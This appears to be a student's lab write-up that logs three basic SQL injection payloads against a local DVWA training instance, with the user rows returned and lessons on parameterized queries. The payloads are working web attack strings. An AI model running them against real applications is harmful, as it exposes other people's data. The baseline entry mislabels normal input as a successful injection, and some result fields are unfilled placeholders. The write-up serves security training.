# SQL Injection Payload Log and Analysis
## Laboratory Information

Application: Damn Vulnerable Web Application (DVWA)

Module: SQL Injection

Security Level: Low

Environment: Local XAMPP installation

Testing Scope: Local DVWA instance only

## Test 0 – Baseline

Input
1
Purpose

Establish normal application behavior before performing SQL Injection tests.

Result

SQL Injection was successful, and the admin account data was retrieved.

Data Returned
```Text
ID: 1
First name: admin
Surname: admin
```
Screenshot
<img width="1791" height="908" alt="Screenshot 2026-08-31 171921" src="https://github.com/user-attachments/assets/602291b9-6982-4ced-891a-696d322e8383" />



Test 1 – Boolean-Based Injection
Payload
' OR '1'='1
Purpose

Test whether the application allows user input to alter the Boolean logic of the SQL query.

Analysis

The expression:

'1'='1'

is always TRUE.

If the application directly concatenates the supplied input into its SQL statement, the injected expression can change the intended logic of the query.

Result

SQL Injection using payload 1 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed
```Text
ID: ' OR '1'='1,
First name: admin, 
Surname: admin

ID: ' OR '1'='1,
First name: Gordon, 
Surname: Brown

ID: ' OR '1'='1,
First name: Hack, 
Surname: Me

ID: ' OR '1'='1,
First name: Pablo, 
Surname: Picasso

ID: ' OR '1'='1,
First name: Bob, 
Surname: Smith
```
Successful?
YES / NO

Screenshot
<img width="1860" height="963" alt="Screenshot 2026-08-31 172158" src="https://github.com/user-attachments/assets/82de9282-5f90-45c0-a166-e1debc7f141b" />


Test 2 – Boolean-Based Variation
Payload
1' OR '1'='1
Purpose

Test another variation of a Boolean-based SQL Injection.

Analysis

The payload attempts to close the original quoted value and introduce an additional Boolean condition that evaluates to TRUE.

Result

SQL Injection using payload 2 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed
```Text
ID: 1' OR '1'='1,
First name: admin, 
Surname: admin

ID: 1' OR '1'='1,
First name: Gordon, 
Surname: Brown

ID: 1' OR '1'='1,
First name: Hack, 
Surname: Me

ID: 1' OR '1'='1,
First name: Pablo, 
Surname: Picasso

ID: 1' OR '1'='1,
First name: Bob, 
Surname: Smith
```

Successful?
YES / NO

Screenshot
<img width="1863" height="985" alt="Screenshot 2026-08-31 172514" src="https://github.com/user-attachments/assets/606daf49-fbde-4363-a0f1-0e3d13de1a29" />


Test 3 – Comment-Based Variation
Payload
1' OR '1'='1' -- 
Purpose

Test whether an SQL comment can cause the remainder of the original query to be ignored.

Analysis

The -- sequence can indicate the beginning of a comment in MySQL-compatible SQL syntax. If recognized in the particular query context, SQL after the comment may not be evaluated as part of the intended statement.

Result

SQL Injection using payload 3 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed
```Text
ID: 1' OR '1'='1 --,
First name: admin, 
Surname: admin

ID: 1' OR '1'='1 --,
First name: Gordon, 
Surname: Brown

ID: 1' OR '1'='1 --,
First name: Hack, 
Surname: Me

ID: 1' OR '1'='1 --,
First name: Pablo, 
Surname: Picasso

ID: 1' OR '1'='1 --,
First name: Bob, 
Surname: Smith
```

Successful?
YES / NO

Screenshot
<img width="1142" height="905" alt="Screenshot 2026-09-27 150119" src="https://github.com/user-attachments/assets/cbfd910c-fcb1-4ee4-b884-c396fadf4ed1" />


## Results Comparison
|Test	      | Payload	       |Technique	            |Successful?  |Data Exposed                                                                |                 |-----------|------------------|----------------------|-------------|----------------------------------------------------------------------------|
|Baseline	|    1	          | Normal input	      |  Yes	     |  SQL Injection was successful, and the admin account data was retrieved.   |
|Test 1     | 	' OR '1'='1	    |Boolean-based SQLi 	|  Yes	     |  SQL Injection using payload 1 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.|
|Test 2     |	1' OR '1'='1	 |  Boolean-based SQLi 	|  Yes	     |  SQL Injection using payload 2 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.|
|Test 3     |	1' OR '1'='1' --|	Boolean + comment	   |  Yes	     |   SQL Injection using payload 3 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.|

## Overall Analysis

The tests demonstrated the risk of constructing SQL statements by directly concatenating user-controlled input into SQL.

The successful payloads were able to alter the intended query logic because the application did not adequately separate user input from SQL syntax at the Low security level.

The vulnerability could be prevented by using parameterized queries or prepared statements.

## Lessons Learned
1. User input should be treated as untrusted.
2. SQL queries should not be constructed through unsafe string concatenation.
3. Parameterized queries separate SQL structure from user data.
4. Security testing should be performed in controlled environments.
5. The information exposed by a vulnerability should be documented accurately rather than assumed.
   
## Ethical Scope

All testing was performed against a locally hosted DVWA instance specifically designed for security training.

No real-world website, server, database, or third-party service was targeted.
